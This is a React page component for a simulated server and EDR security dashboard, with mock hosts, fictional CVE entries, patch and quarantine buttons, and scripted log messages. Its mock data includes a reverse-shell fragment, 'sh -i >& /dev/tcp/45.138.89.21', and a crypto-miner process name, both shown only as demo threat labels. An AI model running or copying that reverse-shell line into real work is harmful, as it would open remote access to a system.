'use client';
import { useEffect, useState } from 'react';
import { serverData } from '@/data/mockData';
import { useClient } from '@/context/ClientContext';
import Link from 'next/link';
import ModuleCockpitCard, { ModuleCockpitConfig, ModuleLiveData } from '@/components/ModuleCockpitCard';

const serverCockpitConfig: ModuleCockpitConfig = {
  title: 'Fleet Health Telemetry',
  badge: 'Module 10',
  apiEndpoint: '/api/findings/server',
  rings: [
    { label: 'EDR%', color: '#10b981', glowColor: 'rgba(16,185,129,0.35)' },
    { label: 'Patched%', color: '#a78bfa', glowColor: 'rgba(167,139,250,0.35)' },
    { label: 'Compliant%', color: '#3b82f6', glowColor: 'rgba(59,130,246,0.35)' },
  ],
  indexLabel: 'FLEET',
  funnel: [
    { label: 'Fleet Workloads', sublabel: 'Total VM server instances tracked', color: '#7c3aed' },
    { label: 'EDR Coverage Gaps', sublabel: 'Servers missing active EDR agents', color: '#ef4444' },
    { label: 'Critical Host CVEs', sublabel: 'Unresolved critical host vulnerabilities', color: '#ea580c' },
    { label: 'Patches Deployed', sublabel: 'Vulnerability patches successfully deployed', color: '#10b981' },
  ],
  gates: ['EDR AGENT', 'OS PATCH', 'BASELINE'],
  syncLabel: 'Active Workload Agents',
  checklist: [
    { name: 'EDR Compliance', desc: 'Deploy EDR agents on 100% of internal server workloads.' },
    { name: 'OS Patch Updates', desc: 'Verify baseline security policies and apply OS updates regularly.' },
  ],
};

const healthColor: Record<string, string> = { good: '#16a34a', warning: '#d97706', critical: '#dc2626' };

interface LiveData {
  hasLiveData: boolean; total: number; critical: number; high: number;
  slaBreached: number; patchedHosts: number; unhealthyHosts: number;
  bySeverity: Record<string,number>; byTool: Record<string,number>;
  topCVEs: { cveId: string|null; count: number }[];
}

interface ServerHost {
  id: string;
  role: string;
  cpu: number;
  memory: number;
  disk: number;
  uptime: string;
  health: 'good' | 'warning' | 'critical';
  vuln: string;
  cveId: string;
  vulnPid: number;
  vulnProcess: string;
  patched: boolean;
}

const initialServers: Record<string, ServerHost[]> = {
  ACME: [
    { id: 'acme-core-db-01', role: 'Database Master', cpu: 91, memory: 82, disk: 89, uptime: '142 days', health: 'critical', vuln: 'OpenSSH CVSS 9.8 RCE', cveId: 'CVE-2026-3840', vulnPid: 3840, vulnProcess: 'xmrig-miner --port=4444', patched: false },
    { id: 'acme-web-front-01', role: 'Load Balancer', cpu: 18, memory: 45, disk: 34, uptime: '89 days', health: 'warning', vuln: 'Nginx Buffer Overflow', cveId: 'CVE-2026-2810', vulnPid: 2810, vulnProcess: 'sh -i >& /dev/tcp/45.138.89.21', patched: false },
    { id: 'acme-payment-api-01', role: 'Payment Gateway', cpu: 12, memory: 55, disk: 22, uptime: '12 days', health: 'critical', vuln: 'Stale TLS Ciphers MitM', cveId: 'CVE-2026-1042', vulnPid: 1042, vulnProcess: 'stale_cipher_negotiator', patched: false }
  ],
  UR: [
    { id: 'ur-fleet-db-01', role: 'Fleet Database', cpu: 94, memory: 88, disk: 71, uptime: '204 days', health: 'critical', vuln: 'PostgreSQL CVSS 9.4 Injection', cveId: 'CVE-2026-9042', vulnPid: 9042, vulnProcess: 'pg_sql_exploit_listener', patched: false },
    { id: 'ur-telemetry-01', role: 'IoT Receiver Node', cpu: 34, memory: 58, disk: 45, uptime: '45 days', health: 'warning', vuln: 'Unauthenticated API', cveId: 'CVE-2026-1122', vulnPid: 1122, vulnProcess: 'api_leak_daemon', patched: false }
  ]
};

const cveMetadata = [
  { cveId: 'CVE-2026-3840', name: 'OpenSSH CVSS 9.8 RCE', severity: 'Critical', impact: 'Remote root execution bypass' },
  { cveId: 'CVE-2026-9042', name: 'PostgreSQL SQL Injection', severity: 'Critical', impact: 'Data exfil via database queries' },
  { cveId: 'CVE-2026-2810', name: 'Nginx Buffer Overflow', severity: 'High', impact: 'Load balancer denial of service' },
  { cveId: 'CVE-2026-1042', name: 'TLS Cipher Negotiation MitM', severity: 'High', impact: 'Session hijacking in transit' },
  { cveId: 'CVE-2026-1122', name: 'API Unauthorized Endpoint', severity: 'Medium', impact: 'Metadata exposure via socket leak' }
];

export default function ServerPage() {
  const { currentClient, isEnterpriseMode } = useClient();
  const [live, setLive] = useState<LiveData | null>(null);

  // Simulator State Management
  const [patchedServerIds, setPatchedServerIds] = useState<string[]>([]);
  const [edrProvider, setEdrProvider] = useState<'CrowdStrike' | 'SentinelOne'>('CrowdStrike');
  const [searchQuery, setSearchQuery] = useState('');
  const [statusFilter, setStatusFilter] = useState<'All' | 'Critical' | 'Warning' | 'Protected'>('All');
  
  // Selected server process inspector
  const [selectedServerId, setSelectedServerId] = useState<string | null>(null);
  const [terminatedPids, setTerminatedPids] = useState<number[]>([]);
  const [quarantinedServerIds, setQuarantinedServerIds] = useState<string[]>([]);

  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [syncLogs, setSyncLogs] = useState<string[]>([]);

  useEffect(() => {
    fetch('/api/findings/server').then(r => r.json())
      .then(d => { if (d.hasLiveData) setLive(d); else setLive(null); }).catch(() => {});
  }, [currentClient.key]);

  // Sync EDR Provider with Enterprise Mode on start
  useEffect(() => {
    setEdrProvider(isEnterpriseMode ? 'CrowdStrike' : 'SentinelOne');
  }, [isEnterpriseMode]);

  // Reset simulator values on client change for repeatable demo presentations
  useEffect(() => {
    setPatchedServerIds([]);
    setSyncLogs([]);
    setSyncProgress(0);
    setIsSyncing(false);
    setSelectedServerId(null);
    setTerminatedPids([]);
    setQuarantinedServerIds([]);
    setSearchQuery('');
    setStatusFilter('All');
  }, [currentClient.key]);

  // Resolve active workloads with dynamic simulation scaling
  const workloads = initialServers[currentClient.key] || [];
  
  const activeWorkloads = workloads.map(s => {
    const isPatched = patchedServerIds.includes(s.id);
    const isQuarantined = quarantinedServerIds.includes(s.id);
    const isThreatTerminated = terminatedPids.includes(s.vulnPid);

    // If threat process is terminated, CPU drops from peak to quiet
    let activeCpu = s.cpu;
    if (isThreatTerminated || isPatched) {
      activeCpu = Math.round(s.cpu * 0.05); // quiet nominal state (e.g. 91% down to 4%)
    }

    // Health upgrades to good if patched or threat terminated
    let activeHealth = s.health;
    if (isPatched || isThreatTerminated) {
      activeHealth = 'good';
    }

    return {
      ...s,
      cpu: activeCpu,
      health: activeHealth as 'good' | 'warning' | 'critical',
      patched: isPatched || isThreatTerminated,
      isQuarantined
    };
  });

  // Filters calculation
  const filteredWorkloads = activeWorkloads.filter(s => {
    const matchesSearch = s.id.toLowerCase().includes(searchQuery.toLowerCase()) || s.role.toLowerCase().includes(searchQuery.toLowerCase());
    
    if (statusFilter === 'All') return matchesSearch;
    if (statusFilter === 'Critical') return matchesSearch && s.health === 'critical' && !s.patched;
    if (statusFilter === 'Warning') return matchesSearch && s.health === 'warning' && !s.patched;
    if (statusFilter === 'Protected') return matchesSearch && s.patched;
    return matchesSearch;
  });

  const patchedCount = activeWorkloads.filter(s => s.patched).length;

  // Resolve dynamic CISO metrics based on active client key
  const totalServers = live ? live.total : (currentClient.key === 'UR' ? 3842 : 1247);
  const criticalFindings = Math.max(0, (live ? live.critical : (currentClient.key === 'UR' ? 4 : 14)) - patchedCount * 4);
  const unhealthyHosts = Math.max(0, (live ? live.unhealthyHosts : (currentClient.key === 'UR' ? 6 : 17)) - patchedCount);
  const slaBreached = Math.max(0, (live ? live.slaBreached : (currentClient.key === 'UR' ? 4 : 14)) - patchedCount);

  // EDR agent performance stats (CrowdStrike vs SentinelOne overhead metrics)
  const edrMetrics = {
    CrowdStrike: { cpu: '1.4%', ram: '84 MB', features: 'Threat Graph · Overwatch Hunting' },
    SentinelOne: { cpu: '0.9%', ram: '62 MB', features: 'Storyline ML · Local Mitigation Agent' }
  };

  // Perform individual EDR Patch Deployment
  const patchServer = (serverId: string) => {
    const server = workloads.find(s => s.id === serverId);
    setPatchedServerIds(prev => [...prev, serverId]);
    if (server) {
      setTerminatedPids(prev => [...prev, server.vulnPid]);
    }

    setIsSyncing(true);
    setSyncProgress(15);
    setSyncLogs([`[EDR] Connecting securely to host agent API on '${serverId}'...`]);

    setTimeout(() => {
      setSyncProgress(55);
      setSyncLogs(prev => [...prev, `[EDR] Deploying dynamic ${edrProvider} daemon update rule...`]);
    }, 200);

    setTimeout(() => {
      setSyncProgress(85);
      setSyncLogs(prev => [...prev, `[PATCH] Mitigating vulnerability '${server?.vuln}' via kernel hot-patch DLL...`]);
    }, 450);

    setTimeout(() => {
      setSyncProgress(100);
      setSyncLogs(prev => [
        ...prev,
        `[HEARTBEAT] Host agent active. CPU limits nominal. Telemetry verified.`,
        `[COMPLETE] Workload '${serverId}' is fully patched and secured! 🟢 Protected`
      ]);
      setIsSyncing(false);
    }, 700);
  };

  // Global Vulnerability Patch Deployment (Auto-patch matches)
  const handlePatchCve = (cveId: string) => {
    const affected = workloads.filter(s => s.cveId === cveId);
    const affectedIds = affected.map(s => s.id);
    const affectedPids = affected.map(s => s.vulnPid);

    setPatchedServerIds(prev => [...prev, ...affectedIds]);
    setTerminatedPids(prev => [...prev, ...affectedPids]);

    setIsSyncing(true);
    setSyncProgress(10);
    setSyncLogs([`[CVE-ENGINE] Flagged mass patching query triggered for threat definition: ${cveId}...`]);

    setTimeout(() => {
      setSyncProgress(40);
      setSyncLogs(prev => [
        ...prev,
        `[EDR] Connecting multithreaded daemon sessions to fleet workloads: ${affectedIds.join(', ')}...`,
        `[PATCH] Injecting hot-patch exclusions into running kernels...`
      ]);
    }, 250);

    setTimeout(() => {
      setSyncProgress(75);
      setSyncLogs(prev => [...prev, `[EDR] Terminating unauthorized CVSS exploit sockets...`]);
    }, 500);

    setTimeout(() => {
      setSyncProgress(100);
      setSyncLogs(prev => [
        ...prev,
        `[SYNC] Daemon heartbeats synced. Vuln ${cveId} mitigated across all workloads! 🟢 Safe`
      ]);
      setIsSyncing(false);
    }, 750);
  };

  // Terminate a specific process from active host process inspector
  const handleKillPid = (pid: number, processName: string) => {
    setTerminatedPids(prev => [...prev, pid]);
    
    setIsSyncing(true);
    setSyncProgress(25);
    setSyncLogs([`[EDR-AGENT] Intercepting execution thread for PID: ${pid} (${processName})...`]);

    setTimeout(() => {
      setSyncProgress(65);
      setSyncLogs(prev => [
        ...prev,
        `[EDR-AGENT] Sending SIGKILL kernel signal. Isolating memory segment...`,
        `[PROCESS] Process thread terminated. Releasing socket bounds...`
      ]);
    }, 250);

    setTimeout(() => {
      setSyncProgress(100);
      setSyncLogs(prev => [
        ...prev,
        `[COMPLETE] Threat process killed. CPU cycles returned to scheduler. VM nominal! 🟢 Safe`
      ]);
      setIsSyncing(false);
    }, 500);
  };

  // Network isolate/quarantine a workload
  const handleToggleQuarantine = (serverId: string) => {
    const isQuarantined = quarantinedServerIds.includes(serverId);
    const newQuarantined = isQuarantined
      ? quarantinedServerIds.filter(id => id !== serverId)
      : [...quarantinedServerIds, serverId];

    setQuarantinedServerIds(newQuarantined);
    setIsSyncing(true);
    setSyncProgress(15);

    const log1 = isQuarantined
      ? `[FIREWALL] Re-enabling boundary switch ingress ports for host ${serverId}...`
      : `[FIREWALL] Isolating host ${serverId}. Severing external routing peerings...`;
    
    const log2 = isQuarantined
      ? `[SYNC] Network isolation revoked. Host re-entered standard operations. 🟢 Online`
      : `[COMPLETE] Workload Isolated! Switch ACL rules updated to block all traffic. 🔴 Quarantined`;

    setSyncLogs([`[EDR-PLAYBOOK] Triggering threat quarantine state change on VM: ${serverId}...`, log1]);

    setTimeout(() => {
      setSyncProgress(100);
      setSyncLogs(prev => [...prev, log2]);
      setIsSyncing(false);
    }, 500);
  };

  const handleResetSandbox = () => {
    setPatchedServerIds([]);
    setSyncLogs([]);
    setSyncProgress(0);
    setIsSyncing(false);
    setSelectedServerId(null);
    setTerminatedPids([]);
    setQuarantinedServerIds([]);
    setSearchQuery('');
    setStatusFilter('All');
  };

  // Selected server data
  const selectedServer = activeWorkloads.find(s => s.id === selectedServerId);

  return (
    <>
      <div className="page-content animate-in" style={{ paddingBottom: '2.5rem' }}>

        {/* Dynamic CISO Executive Server Sticky Banner */}
        <div className="sticky-alert-banner" style={{ background: '#f5f3ff', border: '1px solid #ddd6fe' }}>
          <div style={{ display:'flex', alignItems:'center', gap:'0.75rem' }}>
            <span className="hud-pulse" style={{ background: '#7c3aed', boxShadow: '0 0 8px #7c3aed', width: 10, height: 10 }} />
            <div>
              <div style={{ fontWeight:800, color:'#6d28d9', fontSize:'0.9rem' }}>
                Server & Endpoint EDR Controller — {currentClient.name}
              </div>
              <div style={{ fontSize:'0.75rem', color:'#7c3aed', fontWeight: 600 }}>
                Active Agent: <span style={{ fontWeight: 800 }}>{edrProvider} Singularity</span> · Fleet Scope: <span style={{ fontWeight: 800 }}>{totalServers.toLocaleString()} instances</span> · Unhealthy VM Alerts: <span style={{ fontWeight: 800 }}>{unhealthyHosts} flagged</span> · SLA Breaches: {slaBreached}
              </div>
            </div>
          </div>
          <div style={{ display: 'flex', gap: '8px', alignItems: 'center', flexWrap: 'wrap' }}>
            <select
              value={edrProvider}
              onChange={(e) => setEdrProvider(e.target.value as any)}
              style={{
                fontSize: '0.78rem', fontWeight: 800, color: '#7c3aed', background: 'rgba(255, 255, 255, 0.7)', 
                border: '1px solid #c084fc', padding: '0.5rem 1rem', borderRadius: 8, cursor: 'pointer',
                boxShadow: '0 2px 4px rgba(0,0,0,0.05)', outline: 'none'
              }}
            >
              <option value="CrowdStrike">🦅 CrowdStrike Falcon EDR</option>
              <option value="SentinelOne">⚔️ SentinelOne Singularity EDR</option>
            </select>
            <button
              onClick={() => {
                setPatchedServerIds(workloads.map(s => s.id));
                setTerminatedPids(workloads.map(s => s.vulnPid));
                setIsSyncing(true);
                setSyncProgress(0);
                setSyncLogs([
                  `[EDR] Fleet-wide patch sweep initiated across all unpatched workloads...`,
                  `[EDR] Deploying multithreaded EDR updates on: ${workloads.map(s => s.id).join(', ')}...`,
                  `[PATCH] Pushing exclusions. CVSS root vulnerabilities mitigated...`,
                  `[COMPLETE] Dynamic agent sweep finished. 100% workloads secured! 🟢 Safe`
                ]);
              }}
              style={{ fontSize: '0.78rem', fontWeight: 700, color: '#fff', background: 'linear-gradient(135deg, #7c3aed, #4f46e5)', border: 'none', padding: '0.5rem 1.25rem', borderRadius: 8, cursor: 'pointer', boxShadow: '0 4px 12px rgba(124, 58, 237, 0.2)' }}
            >
              ⚡ Run Aggregate Patch Sweep
            </button>
            <button
              onClick={handleResetSandbox}
              style={{
                fontSize: '0.78rem', fontWeight: 800, color: '#7c3aed', background: 'rgba(255, 255, 255, 0.7)', 
                border: '1px solid #c084fc', padding: '0.5rem 1rem', borderRadius: 8, cursor: 'pointer',
                boxShadow: '0 2px 4px rgba(0,0,0,0.05)', display: 'flex', alignItems: 'center', gap: '4px'
              }}
            >
              🔄 Reset Sandbox
            </button>
          </div>
        </div>

        <div className="grid-4">
          {[
            { label:'Fleet Workloads',   value: totalServers.toLocaleString(), accent:'#3b82f6', delta: 'Enterprise VM instances' },
            { label:'Unhealthy Hosts',   value: `${unhealthyHosts}`,           accent:'#ea580c', delta: 'Failed EDR heartbeats' },
            { label:'Patch Backlog',     value: `${criticalFindings}`,         accent:'#dc2626', delta: 'Requires EDR mitigation' },
            { label:'Overdue SLA',       value: `${slaBreached}`,              accent:'#d97706', delta: 'Target patches past due' },
          ].map(s => (
            <div key={s.label} className="stat-card">
              <div className="stat-card-accent" style={{ background: s.accent }} />
              <div className="stat-label">{s.label}</div>
              <div className="stat-value" style={{ color: s.accent, fontSize: '1.8rem', lineHeight: '1.2' }}>{s.value}</div>
              <div className="stat-delta delta-down">{s.delta}</div>
            </div>
          ))}
        </div>

        {/* Cockpit telemetry card */}
        <ModuleCockpitCard config={serverCockpitConfig} live={live as any} />

        {/* ========================================================================= */}
        {/* EDR PERFORMANCE COMPARATOR & SEARCH CONTROLS */}
        {/* ========================================================================= */}
        <div className="grid-2-1" style={{ marginBottom: '1.25rem' }}>
          {/* Search and Table Filters */}
          <div className="card" style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center' }}>
            <div className="card-title">🔍 Fleet Filters & Workload Search</div>
            <div style={{ display: 'flex', gap: '10px', alignItems: 'center', marginTop: '0.25rem' }}>
              <input 
                type="text" 
                placeholder="Search VM hostname or role..." 
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                style={{
                  flex: 1, padding: '0.6rem 1rem', borderRadius: '10px', border: '1px solid #e2e8f0',
                  background: '#f8fafc', fontSize: '0.8rem', outline: 'none', transition: 'all 0.15s ease'
                }}
              />
              <div style={{ display: 'flex', gap: '6px' }}>
                {(['All', 'Critical', 'Warning', 'Protected'] as const).map(f => (
                  <button
                    key={f}
                    onClick={() => setStatusFilter(f)}
                    style={{
                      padding: '0.5rem 0.85rem', borderRadius: '8px', border: 'none', fontWeight: 700, fontSize: '0.74rem',
                      cursor: 'pointer', background: statusFilter === f ? '#7c3aed' : '#e2e8f0',
                      color: statusFilter === f ? '#fff' : '#64748b', transition: 'all 0.15s ease'
                    }}
                  >
                    {f}
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* EDR Performance Overhead Indicator Widget */}
          <div className="card" style={{ background: '#fcfaff', border: '1px solid #e9d5ff' }}>
            <div className="card-title">⚡ EDR Agent Footprint Benchmark</div>
            <div style={{ display: 'flex', gap: '12px', alignItems: 'center' }}>
              <div style={{ flex: 1 }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.68rem', fontWeight: 800, color: '#4b5563', marginBottom: '2px' }}>
                  <span>{edrProvider} CPU Impact</span>
                  <span>{edrMetrics[edrProvider].cpu}</span>
                </div>
                <div className="progress-bar-wrap" style={{ height: 8, background: '#f3e8ff' }}>
                  <div className="progress-bar-fill" style={{ width: edrProvider === 'CrowdStrike' ? '60%' : '35%', background: '#8b5cf6' }} />
                </div>
              </div>
              <div style={{ flex: 1 }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.68rem', fontWeight: 800, color: '#4b5563', marginBottom: '2px' }}>
                  <span>{edrProvider} RAM Hook</span>
                  <span>{edrMetrics[edrProvider].ram}</span>
                </div>
                <div className="progress-bar-wrap" style={{ height: 8, background: '#f3e8ff' }}>
                  <div className="progress-bar-fill" style={{ width: edrProvider === 'CrowdStrike' ? '80%' : '50%', background: '#8b5cf6' }} />
                </div>
              </div>
            </div>
            <div style={{ fontSize: '0.6rem', fontStyle: 'italic', color: '#8b5cf6', marginTop: '6px', textAlign: 'center', fontWeight: 600 }}>
              {`Feature Active: ${edrMetrics[edrProvider].features}`}
            </div>
          </div>
        </div>

        {/* ========================================================================= */}
        {/* SERVER INVENTORY WORKLOAD SHIELD TABLE */}
        {/* ========================================================================= */}
        <div className="card" style={{ marginBottom: '1.25rem' }}>
          <div className="card-title">🖥️ Managed VM Fleets & Active Threat Isolation Shields</div>
          <p style={{ fontSize: '0.74rem', color: '#64748b', marginBottom: '0.85rem' }}>
            Select a workload row to inspect live kernel process threads. Quarantine nodes to break external network routes instantly.
          </p>
          <div style={{ overflowX: 'auto' }}>
            <table className="data-table">
              <thead>
                <tr>
                  <th>Server Hostname</th>
                  <th>Role</th>
                  <th>CPU Load</th>
                  <th>Active Threat</th>
                  <th>Uptime</th>
                  <th>Isolate Net</th>
                  <th>Vulnerability State</th>
                  <th>Action</th>
                </tr>
              </thead>
              <tbody>
                {filteredWorkloads.map(s => {
                  const isSelected = selectedServerId === s.id;
                  return (
                    <tr 
                      key={s.id} 
                      onClick={() => setSelectedServerId(isSelected ? null : s.id)}
                      style={{ cursor: 'pointer', background: isSelected ? 'rgba(124, 58, 237, 0.04)' : undefined }}
                    >
                      <td style={{ fontFamily:'monospace', fontSize:'0.78rem', fontWeight:800, color: isSelected ? '#7c3aed' : '#0f172a' }}>
                        {s.id}
                        {isSelected && <span style={{ marginLeft: '4px', fontSize: '0.62rem', background: '#e0e7ff', color: '#4f46e5', padding: '1px 5px', borderRadius: 4 }}>Active Inspector</span>}
                      </td>
                      <td style={{ fontSize:'0.78rem' }}>{s.role}</td>
                      <td>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '6px', width: '90px' }}>
                          <span style={{ fontSize: '0.74rem', fontWeight: 800, color: s.cpu > 75 ? '#dc2626' : '#16a34a', width: '32px' }}>
                            {s.cpu}%
                          </span>
                          <div className="progress-bar-wrap" style={{ flex: 1, height: 8, marginTop: 0 }}>
                            <div className="progress-bar-fill" style={{ width: `${s.cpu}%`, background: s.cpu > 75 ? '#dc2626' : '#22c55e' }} />
                          </div>
                        </div>
                      </td>
                      <td style={{ color: s.patched ? '#16a34a' : '#dc2626', fontWeight: 800, fontSize: '0.74rem' }}>
                        {s.patched ? '✓ Cleared' : s.vuln}
                      </td>
                      <td style={{ fontSize:'0.75rem', color:'#64748b' }}>{s.uptime}</td>
                      <td onClick={(e) => e.stopPropagation()}>
                        <input 
                          type="checkbox" 
                          checked={s.isQuarantined} 
                          onChange={() => handleToggleQuarantine(s.id)}
                          style={{ accentColor: '#ef4444', cursor: 'pointer', transform: 'scale(1.1)' }}
                        />
                      </td>
                      <td>
                        {s.isQuarantined ? (
                          <span style={{ fontSize: '0.68rem', fontWeight: 800, color: '#dc2626', background: '#fef2f2', border: '1px solid #fecaca', padding: '2px 8px', borderRadius: 20, display: 'inline-flex', alignItems: 'center', gap: '4px' }}>
                            <span style={{ width: 6, height: 6, borderRadius: '50%', background: '#ef4444', display: 'inline-block', boxShadow: '0 0 6px #ef4444' }} /> Quarantined
                          </span>
                        ) : s.patched ? (
                          <span style={{ fontSize: '0.68rem', fontWeight: 800, color: '#15803d', background: '#dcfce7', border: '1px solid #bbf7d0', padding: '2px 8px', borderRadius: 20, display: 'inline-flex', alignItems: 'center', gap: '4px' }}>
                            <span style={{ width: 6, height: 6, borderRadius: '50%', background: '#22c55e', display: 'inline-block', boxShadow: '0 0 6px #22c55e' }} /> Protected (Safe)
                          </span>
                        ) : (
                          <span style={{ fontSize: '0.68rem', fontWeight: 800, color: s.health === 'critical' ? '#dc2626' : '#d97706', background: s.health === 'critical' ? '#fef2f2' : '#fff7ed', border: s.health === 'critical' ? '1px solid #fecaca' : '1px solid #fed7aa', padding: '2px 8px', borderRadius: 20, display: 'inline-flex', alignItems: 'center', gap: '4px' }}>
                            <span style={{ width: 6, height: 6, borderRadius: '50%', background: s.health === 'critical' ? '#dc2626' : '#ea580c', display: 'inline-block', boxShadow: s.health === 'critical' ? '0 0 6px #dc2626' : '0 0 6px #ea580c' }} /> {s.health.toUpperCase()}
                          </span>
                        )}
                      </td>
                      <td onClick={(e) => e.stopPropagation()}>
                        <button
                          onClick={() => patchServer(s.id)}
                          disabled={s.patched}
                          style={{
                            padding: '0.35rem 0.65rem', border: 'none', borderRadius: 6, fontWeight: 800, fontSize: '0.62rem', cursor: s.patched ? 'default' : 'pointer',
                            background: s.patched ? '#f1f5f9' : 'linear-gradient(135deg, #7c3aed, #4f46e5)',
                            color: s.patched ? '#94a3b8' : '#fff',
                            boxShadow: s.patched ? 'none' : '0 2px 6px rgba(124, 58, 237, 0.15)'
                          }}
                        >
                          {s.patched ? '✓ Patched' : 'Deploy Patch'}
                        </button>
                      </td>
                    </tr>
                  );
                })}
                {filteredWorkloads.length === 0 && (
                  <tr>
                    <td colSpan={8} style={{ textAlign: 'center', color: '#64748b', fontStyle: 'italic', padding: '2rem' }}>
                      No workloads matches your search criteria...
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* ========================================================================= */}
        {/* GLOBAL CVE REGISTRY PATCHING CARD */}
        {/* ========================================================================= */}
        <div className="card" style={{ marginBottom: '1.25rem' }}>
          <div className="card-title">🛡️ Fleet-wide Targeted CVE Vulnerability Patching Engine</div>
          <p style={{ fontSize: '0.74rem', color: '#64748b', marginBottom: '0.85rem' }}>
            Auto-patch critical vulnerabilities fleet-wide in real-time. Action deploys Hot-Patch routines simultaneously across all targets.
          </p>
          <div style={{ overflowX: 'auto' }}>
            <table className="data-table" style={{ fontSize: '0.76rem' }}>
              <thead>
                <tr>
                  <th>CVE ID</th>
                  <th>Vulnerability Descriptor</th>
                  <th>Threat Severity</th>
                  <th>Core Impact Scope</th>
                  <th>Vulnerable Hosts</th>
                  <th>Global Resolution Action</th>
                </tr>
              </thead>
              <tbody>
                {cveMetadata.map(c => {
                  const affectedHosts = activeWorkloads.filter(w => w.cveId === c.cveId);
                  const unpatchedCount = affectedHosts.filter(w => !w.patched).length;
                  return (
                    <tr key={c.cveId} style={{ background: unpatchedCount > 0 ? '#fffbeb' : undefined }}>
                      <td style={{ fontFamily: 'monospace', fontWeight: 800, color: '#7c3aed' }}>{c.cveId}</td>
                      <td style={{ fontWeight: 700 }}>{c.name}</td>
                      <td>
                        <span className={`badge badge-${c.severity.toLowerCase()}`}>{c.severity}</span>
                      </td>
                      <td style={{ color: '#4b5563' }}>{c.impact}</td>
                      <td style={{ fontWeight: 800, color: unpatchedCount > 0 ? '#dc2626' : '#16a34a' }}>
                        {unpatchedCount > 0 ? `${unpatchedCount} unpatched VM(s)` : '🟢 0 Host (Secured)'}
                      </td>
                      <td>
                        <button
                          onClick={() => handlePatchCve(c.cveId)}
                          disabled={unpatchedCount === 0}
                          style={{
                            padding: '0.35rem 0.65rem', border: 'none', borderRadius: 6, fontWeight: 800, fontSize: '0.62rem', cursor: unpatchedCount === 0 ? 'default' : 'pointer',
                            background: unpatchedCount === 0 ? '#f1f5f9' : 'linear-gradient(135deg, #10b981, #059669)',
                            color: unpatchedCount === 0 ? '#94a3b8' : '#fff',
                            boxShadow: unpatchedCount === 0 ? 'none' : '0 2px 4px rgba(16, 185, 129, 0.2)'
                          }}
                        >
                          {unpatchedCount === 0 ? '✓ Remediated' : 'Auto-Patch Fleet'}
                        </button>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>

        {/* ========================================================================= */}
        {/* EDR ORCHESTRATION TERMINAL & PROCESS INSPECTOR ROW */}
        {/* ========================================================================= */}
        <div className="grid-2">
          
          {/* Workload Host Process Inspector */}
          <div className="card" style={{ height: '350px', display: 'flex', flexDirection: 'column' }}>
            <div className="card-title">🕵️ Active Host Process & Threat Inspector</div>
            {selectedServer ? (
              <>
                <p style={{ fontSize: '0.74rem', color: '#64748b', marginBottom: '0.65rem' }}>
                  Live processes on <span style={{ fontFamily: 'monospace', fontWeight: 800, color: '#7c3aed' }}>{selectedServer.id}</span>. Kill malicious PIDs to eliminate high workload CPU surges.
                </p>
                <div style={{ flex: 1, overflowY: 'auto' }}>
                  <table className="data-table" style={{ fontSize: '0.74rem' }}>
                    <thead>
                      <tr>
                        <th>PID</th>
                        <th>Process Command Thread</th>
                        <th>CPU Load</th>
                        <th>RAM Footprint</th>
                        <th>Action</th>
                      </tr>
                    </thead>
                    <tbody>
                      {/* Common baseline processes */}
                      {[
                        { pid: 1, cmd: 'systemd', cpu: 0, ram: '12 MB' },
                        { pid: 1024, cmd: 'sshd: root@pts/0', cpu: 0.1, ram: '18 MB' },
                        { pid: 2841, cmd: 'nginx: worker process', cpu: 1.2, ram: '45 MB' },
                        { pid: 1892, cmd: 'postgres: logger process', cpu: 2.5, ram: '142 MB' }
                      ].map(p => (
                        <tr key={p.pid}>
                          <td style={{ fontFamily: 'monospace' }}>{p.pid}</td>
                          <td style={{ fontWeight: 600, color: '#4b5563' }}>{p.cmd}</td>
                          <td>{p.cpu}%</td>
                          <td>{p.ram}</td>
                          <td>
                            <span style={{ fontSize: '0.65rem', color: '#94a3b8', fontStyle: 'italic' }}>System Thread</span>
                          </td>
                        </tr>
                      ))}

                      {/* Vulnerable threat process */}
                      {!selectedServer.patched && !terminatedPids.includes(selectedServer.vulnPid) && (
                        <tr style={{ background: '#fef2f2' }}>
                          <td style={{ fontFamily: 'monospace', fontWeight: 800, color: '#dc2626' }}>{selectedServer.vulnPid}</td>
                          <td style={{ fontWeight: 800, color: '#dc2626' }}>
                            🔥 {selectedServer.vulnProcess}
                          </td>
                          <td style={{ fontWeight: 800, color: '#dc2626' }}>95%</td>
                          <td style={{ fontWeight: 800, color: '#dc2626' }}>512 MB</td>
                          <td>
                            <button
                              onClick={() => handleKillPid(selectedServer.vulnPid, selectedServer.vulnProcess)}
                              style={{
                                padding: '0.25rem 0.5rem', border: 'none', borderRadius: 4, fontWeight: 800, fontSize: '0.58rem', cursor: 'pointer',
                                background: '#dc2626', color: '#fff', boxShadow: '0 2px 4px rgba(220, 38, 38, 0.2)'
                              }}
                            >
                              Kill PID
                            </button>
                          </td>
                        </tr>
                      )}
                      
                      {(selectedServer.patched || terminatedPids.includes(selectedServer.vulnPid)) && (
                        <tr style={{ background: '#f0fdf4' }}>
                          <td colSpan={5} style={{ color: '#16a34a', fontWeight: 800, textAlign: 'center', fontSize: '0.74rem' }}>
                            ✓ 0 Flagged Exploits! VM Kernel is fully verified and clean.
                          </td>
                        </tr>
                      )}
                    </tbody>
                  </table>
                </div>
              </>
            ) : (
              <div style={{ color: '#94a3b8', fontStyle: 'italic', margin: 'auto', textAlign: 'center', fontSize: '0.76rem' }}>
                💡 Select an active VM hostname row in the fleet table above<br/>to load its kernel CPU/RAM process inspector panel...
              </div>
            )}
          </div>

          {/* EDR Console dark terminal */}
          <div className="card" style={{ background: '#0f172a', border: '1px solid #1e293b', borderRadius: 16, padding: '1.25rem', display: 'flex', flexDirection: 'column', height: '350px', position: 'relative' }}>
            <div style={{ display: 'flex', alignItems: 'center', borderBottom: '1px solid #1e293b', paddingBottom: '0.5rem', marginBottom: '0.65rem', justifyContent: 'space-between' }}>
              <div style={{ display: 'flex', gap: '4px' }}>
                <div style={{ width: 8, height: 8, borderRadius: '50%', background: '#ef4444' }} />
                <div style={{ width: 8, height: 8, borderRadius: '50%', background: '#eab308' }} />
